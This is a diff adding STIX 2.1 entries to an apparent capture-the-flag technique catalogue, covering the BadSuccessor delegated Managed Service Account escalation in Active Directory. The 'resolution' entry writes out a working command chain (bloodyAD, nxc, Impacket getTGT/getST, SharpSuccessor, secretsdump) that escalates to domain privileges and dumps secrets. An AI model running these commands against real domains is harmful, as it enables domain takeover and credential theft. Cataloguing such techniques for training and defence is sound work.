@@ -1529,6 +1529,83 @@
       "source_ref": "course-of-action--605662db-9f29-58df-8580-a2405999d2c7",
       "target_ref": "attack-pattern--67ef0916-f8b2-5596-a5e5-c4e098f2aa56",
       "description": "Counter-technique recovers/defeats the paired design technique. `mitigates` is kept for STIX-consumer compatibility; the CTFT semantics are carried by x_ctft_relation."
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--68be70b3-4c5c-551b-8073-87ed8a9bfe2c",
+      "created": "2026-06-10T18:01:52.000Z",
+      "modified": "2026-06-10T18:01:52.000Z",
+      "created_by_ref": "identity--930a2431-32e6-5652-ae5b-e36316353d39",
+      "name": "CTFTTE-FPN-021 - Delegated managed service account linked to a privileged predecessor",
+      "description": "A low-privileged principal is delegated CreateChild on one organizational unit — a routine help-desk or service-management grant, not a privileged one. On a domain whose schema supports delegated Managed Service Accounts, that grant is enough: the principal creates its own dMSA, writes a privileged account's name into msDS-ManagedAccountPrecededByLink, and sets msDS-DelegatedMSAState to Completed. No right over the target object is ever required, so ACL reviews of users, groups and computers show nothing. The concealment is an OU permission plus two attribute values, and the escalation completes when the KDC copies the predecessor's SIDs into the successor's PAC.",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "ctft",
+          "phase_name": "fpn"
+        }
+      ],
+      "x_ctft_category": "FPN",
+      "x_ctft_domain": "FPN",
+      "x_ctft_role": "design-hide",
+      "external_references": [
+        {
+          "source_name": "ctft",
+          "external_id": "CTFTTE-FPN-021"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1098",
+          "description": "Account Manipulation"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1078.002",
+          "description": "Valid Accounts: Domain Accounts"
+        }
+      ]
+    },
+    {
+      "type": "course-of-action",
+      "spec_version": "2.1",
+      "id": "course-of-action--267751b8-c668-5bd3-b27d-d721df6268cb",
+      "created": "2026-06-10T18:01:52.000Z",
+      "modified": "2026-06-10T18:01:52.000Z",
+      "created_by_ref": "identity--930a2431-32e6-5652-ae5b-e36316353d39",
+      "name": "CTFTCTE-FPN-021 - Enumerate OU create rights and mint a linked successor account",
+      "description": "Read the OU ACLs first; the exploit is worthless without a container where the controlled principal may create a child object. Enumerate with the delegated-permission view rather than guessing: an ACL dump of every OU, a graph query for GenericAll/CreateChild on organizational units, or the dedicated discovery script when a Windows foothold exists. Confirm the domain actually supports dMSA before spending a hop on it. Then perform the gated mutation: create the dMSA in the writable OU, point msDS-ManagedAccountPrecededByLink at the privileged predecessor, set msDS-DelegatedMSAState to Completed, request the successor's TGT and act as the predecessor (directory replication, remote execution). Record the dMSA name and DN so the object can be deleted afterwards; the predecessor object is never modified, so there is nothing else to restore. bash # 1. read-only: which OU can the current principal write a child into? bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local get writable --detail nxc ldap DC01.corp.local -u user -p 'Passw0rd!' -d corp.local --dns-server DC01.corp.local -M badsuccessor # 2. mutation: create the dMSA linked to the predecessor (the successor TGT is saved when the tool manages it) bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local add badSuccessor successordmsa # alternative (Impacket): badsuccessor.py -action add -target-ou <OU DN> # -dmsa-name successor -target-account <predecessor DN> # alternative (Windows): SharpSuccessor.exe add /path:<OU DN> /account:user /name:successor /impersonate:Administrator # 3. if the tool created the object but not the ticket, mint it explicitly python3 getTGT.py -dc-ip DC corp.local/user:'Passw0rd!' export KRB5CCNAME=user.ccache python3 getST.py -k -no-pass -dc-ip DC -impersonate 'successordmsa$' -self -dmsa corp.local/user # 4. act as the predecessor with the successor ticket export KRB5CCNAME=successordmsa.ccache secretsdump.py -k -no-pass 'successordmsa$'@DC01.corp.local # 5. cleanup: delete the dMSA object bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local remove object 'CN=successordmsa,OU=LabOU,DC=corp,DC=local'",
+      "x_ctft_category": "FPN",
+      "x_ctft_domain": "FPN",
+      "x_ctft_role": "resolution",
+      "external_references": [
+        {
+          "source_name": "ctft",
+          "external_id": "CTFTCTE-FPN-021"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1098",
+          "description": "Account Manipulation"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1078.002",
+          "description": "Valid Accounts: Domain Accounts"
+        }
+      ]
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--6478719c-1e1c-5d48-af5f-881a6a644db1",
+      "created": "2026-06-10T18:01:52.000Z",
+      "modified": "2026-06-10T18:01:52.000Z",
+      "created_by_ref": "identity--930a2431-32e6-5652-ae5b-e36316353d39",
+      "relationship_type": "mitigates",
+      "x_ctft_relation": "solves",
+      "source_ref": "course-of-action--267751b8-c668-5bd3-b27d-d721df6268cb",
+      "target_ref": "attack-pattern--68be70b3-4c5c-551b-8073-87ed8a9bfe2c",
+      "description": "Counter-technique recovers/defeats the paired design technique. `mitigates` is kept for STIX-consumer compatibility; the CTFT semantics are carried by x_ctft_relation."
     }
   ]
 }
